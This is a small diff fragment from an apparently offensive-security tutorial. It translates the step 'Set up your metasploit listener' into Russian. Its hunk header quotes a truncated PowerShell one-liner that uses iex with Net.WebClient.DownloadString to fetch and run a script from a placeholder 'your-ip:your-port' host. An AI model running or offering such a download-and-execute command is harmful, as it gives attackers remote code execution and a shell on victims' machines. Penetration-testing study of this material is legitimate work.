@@ -92,7 +92,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-po
 
 <img src="https://imgur.com/2px77nI.png"/>
 
-Set up your metasploit listener
+Настройте свой прослушиватель metasploit
 
 <img src="https://imgur.com/IKY1jka.png"/>
 
